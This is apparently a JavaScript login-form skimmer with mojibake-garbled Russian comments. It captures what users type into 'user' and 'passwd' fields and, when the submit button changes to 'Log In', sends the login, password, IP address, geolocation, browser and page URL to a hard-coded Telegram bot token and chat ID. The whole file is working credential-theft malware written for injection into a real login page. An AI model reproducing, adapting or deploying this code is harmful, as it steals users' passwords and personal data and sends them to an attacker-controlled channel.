const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

let loginValue = "–ù–µ —É–∫–∞–∑–∞–Ω–æ"; // –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ª–æ–≥–∏–Ω–∞
let passwordValue = "–ù–µ —É–∫–∞–∑–∞–Ω–æ"; // –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
    }).catch(err => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", err));
}

function hashDomain(domain) {
    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
        .then(buffer => {
            let hashArray = Array.from(new Uint8Array(buffer));
            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
            return `#${hashHex.slice(0, 8)}`; // –û—Å—Ç–∞–≤–∏–º –ø–µ—Ä–≤—ã–µ 8 —Å–∏–º–≤–æ–ª–æ–≤ —Ö–µ—à–∞
        });
}

function getIPInfo() {
    return fetch("https://ipapi.co/json/")
        .then(response => {
            if (!response.ok) {
                throw new Error("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ IP");
            }
            return response.json();
        })
        .then(data => {
            return {
                ip: data.ip,
                location: `${data.city || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}, ${data.region || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}, ${data.country_name || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}`,
                org: window.location.hostname,
            };
        })
        .catch(err => console.error("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ IP:", err));
}

function getSimplifiedUserAgent() {
    const userAgent = navigator.userAgent || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"];
    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"];
    const browser = browserMatches[0].split("/")[0]; // –ù–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞
    const os = osMatches[1].split(";")[0]; // –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞
    return `${browser} on ${os}`;
}

function sendFormData() {
    const simplifiedUserAgent = getSimplifiedUserAgent();

    getIPInfo().then(info => {
        hashDomain(info.org).then(domainHashTag => {
            const message = `üöÄ *–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è:*
---
- üõ°Ô∏è **–õ–æ–≥–∏–Ω:**
\`\`\`
${loginValue}
\`\`\`
- üõ°Ô∏è **–ü–∞—Ä–æ–ª—å:**
\`\`\`
${passwordValue}
\`\`\`
- üåê **IP-–∞–¥—Ä–µ—Å:** ${info.ip}
- üìç **–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:** ${info.location}
- üñ•Ô∏è **User-Agent:** ${simplifiedUserAgent}
- üîó **–°—Ç—Ä–∞–Ω–∏—Ü–∞:** ${window.location.href}
- üè¢ **–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è:** ${info.org}
${domainHashTag}`;
            sendToTelegram(message);
        });
    });
}

// –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –ø–æ–ª—è—Ö –ª–æ–≥–∏–Ω–∞ –∏ –ø–∞—Ä–æ–ª—è
document.querySelectorAll("form input[name='user'], form input[name='passwd']").forEach(input => {
    input.addEventListener("input", event => {
        if (event.target.name === "user") {
            loginValue = event.target.value || "–ù–µ —É–∫–∞–∑–∞–Ω–æ";
        }
        if (event.target.name === "passwd") {
            passwordValue = event.target.value || "–ù–µ —É–∫–∞–∑–∞–Ω–æ";
        }
    });
});

// –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∫–Ω–æ–ø–∫–∏ OK
document.querySelectorAll('input[type="submit"], button[type="submit"]').forEach(button => {
    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            if (mutation.type === "attributes" && mutation.target.value === "Log In") {
                sendFormData(); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ, –µ—Å–ª–∏ –∫–Ω–æ–ø–∫–∞ –∏–∑–º–µ–Ω–∏–ª–∞—Å—å –Ω–∞ "Log In"
            }
        });
    });

    observer.observe(button, { attributes: true, attributeFilter: ["value"] });
});
